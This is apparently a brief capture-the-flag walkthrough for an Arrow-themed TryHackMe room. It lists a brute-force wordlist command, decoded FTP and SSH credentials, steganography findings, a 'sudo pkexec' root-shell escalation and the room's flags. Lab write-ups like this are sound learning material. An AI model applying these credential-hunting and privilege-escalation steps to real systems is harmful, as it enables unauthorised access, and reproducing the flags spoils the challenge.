export ip=10.10.186.248

```
Web Directory = $ip/island/
crunch 4 4 0123456789 > wordlist.txt
2100/
```

```
what is the file name you found? http://10.10.186.248/island/2100/green-arrow.ticket
```
```
what is the FTP Password? RTy8yhBQdscX => !#th3h00d
base58 ...?? according to cyberchef 
2 users slade,vigilante
```
```
what is the file name with SSH password? 
ftp in vigilante/
Leave_me_alone - wrong magic_headers/filetype - password - the pass for the stego later on
aa.jpg - stego detected
shado - contains slade@$ip SSH password
slade:M3tahuman
user.txt:THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```
```
user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```
```
root.txt 
sudo passwd == acc passwd
sudo -l
pkexec
sudo pkexec --username root /bin/bash
flag = THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```